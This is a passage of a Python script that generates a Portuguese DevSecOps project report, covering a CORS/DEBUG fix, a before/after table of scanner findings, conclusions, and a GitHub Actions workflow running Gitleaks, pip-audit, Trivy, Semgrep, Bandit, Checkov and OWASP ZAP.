    "limites de CPU/memória, <i>probes</i>, namespace dedicado e NetworkPolicy.",
])
h3("CORS permissivo e DEBUG " + O("(Médio, CWE-942)"))
p("O CORS usava <i>allow_origins=['*']</i> com <i>allow_credentials=True</i> "
  "(combinação proibida pela especificação e perigosa) e o <i>DEBUG=true</i> vazava "
  "<i>stack traces</i>. Corrigidos para origens explícitas, métodos/headers restritos, "
  "<i>DEBUG=false</i> por padrão e <b>cabeçalhos de segurança</b> (CSP, "
  "X-Content-Type-Options, X-Frame-Options, HSTS, Referrer-Policy) via middleware.")

# ===========================================================================
# 6. SÍNTESE
# ===========================================================================
h1("6. Síntese de Resultados e Conclusão")
h2("6.1 Antes × Depois por ferramenta")
table([
    ["Etapa / Ferramenta", "Antes", "Depois", "Comentário"],
    ["Gitleaks (segredos)", "6", "0 novos", "Gate no CI; rotação + filter-repo pendente do histórico"],
    ["pip-audit (CVEs)", "51", "18", "Residuais com CVE pós-baseline ou presos por compat."],
    ["Trivy SCA (CVEs)", "36", "—", "1 crítica (python-jose) eliminada"],
    ["Bandit (SAST)", "8", "4", "Remanescentes são falsos positivos (whitelist)"],
    ["Semgrep (SAST)", "7", "1", "Remanescente é falso positivo (text + whitelist)"],
    ["Checkov (IaC)", "54", "14", "Remanescentes: boas práticas de baixa prioridade"],
    ["Trivy config (IaC)", "28", "3", "Remanescentes: risco aceito (egress) / CMK"],
    ["OWASP ZAP (DAST)", "1 Alto (SQLi)", "0 Alto", "SQLi reclassificada como PASS; WARN 8→4"],
], [4.3 * 28, 2.1 * 28, 2.1 * 28, 8.2 * 28], font="TblS", align_left_cols=[0, 3])

h2("6.2 Conclusão")
p("O projeto demonstrou, de ponta a ponta, uma esteira DevSecOps funcional cobrindo as "
  "cinco análises exigidas sobre um sistema com lógica de negócio e superfície de "
  "ataque reais. Mais do que coletar saídas, o trabalho exercitou a <b>interpretação "
  "crítica</b>: separar 6 segredos reais de uma chave de exemplo legítima; reconhecer "
  "que f-strings com <i>whitelist</i> são falsos positivos do SAST; entender que CVEs "
  "residuais de SCA são um alvo móvel de gestão de risco; e perceber que a "
  "severidade-CRITICAL de um egress aberto pode ser um risco aceito conscientemente.")
p("As principais lições foram a <b>complementaridade das técnicas</b> — o DAST "
  "confirmou a SQLi de forma <i>black-box</i>, enquanto o SAST foi essencial para as "
  "falhas autenticadas (RCE, injeção de comando) que o DAST não autenticado não "
  "alcançou — e a importância de <b>validar achados com prova de exploração</b> antes "
  "de priorizar a correção. Todas as vulnerabilidades de médio+ risco foram corrigidas "
  "e revalidadas, com redução expressiva e justificada do ruído remanescente.")

# ===========================================================================
# APÊNDICE A
# ===========================================================================
h1("Apêndice A — Workflow de CI/CD (GitHub Actions)")
small("Arquivo: .github/workflows/devsecops.yml (trecho principal; versão completa no "
      "repositório).")
code(
"name: DevSecOps Pipeline\n"
"on: { push: { branches: [main, develop] }, pull_request: { branches: [main] } }\n"
"permissions: { contents: read, security-events: write }\n"
"jobs:\n"
"  secret-detection:                      # 1) SECRET DETECTION\n"
"    runs-on: ubuntu-latest\n"
"    steps:\n"
"      - uses: actions/checkout@v4\n"
"        with: { fetch-depth: 0 }         # histórico completo\n"
"      - uses: gitleaks/gitleaks-action@v2\n"
"  sca:                                   # 2) SCA\n"
"    steps:\n"
"      - run: pip install pip-audit && pip-audit -r requirements.txt --desc\n"
"      - uses: aquasecurity/trivy-action@0.24.0\n"
"        with: { scan-type: fs, scanners: vuln, format: sarif, output: trivy-sca.sarif }\n"
"  sast:                                  # 3) SAST\n"
"    steps:\n"
"      - run: semgrep scan --config=p/python --config=p/security-audit --sarif -o semgrep.sarif app/\n"
"      - run: bandit -r app/\n"
"  iac-scan:                              # 4) IaC\n"
"    steps:\n"
"      - uses: bridgecrewio/checkov-action@v12\n"
"        with: { framework: 'dockerfile,terraform,kubernetes', output_format: 'cli,sarif' }\n"
"      - uses: aquasecurity/trivy-action@0.24.0\n"
"        with: { scan-type: config }\n"
"  dast:                                  # 5) DAST\n"
"    needs: [sast, sca]\n"
"    steps:\n"
"      - run: docker compose up -d --build   # sobe a API + Postgres\n"
"      - uses: zaproxy/action-baseline@v0.12.0\n"
"        with: { target: 'http://localhost:8000' }\n",
title="devsecops.yml — os cinco jobs obrigatórios")

small("Reprodução local das evidências: as ferramentas foram executadas via Gitleaks "
      "(brew), pip-audit/Semgrep/Bandit/Checkov (Python venv), Trivy (brew) e OWASP ZAP "
      "(contêiner Docker) contra a API em execução. Artefatos em security-reports/.")

render()
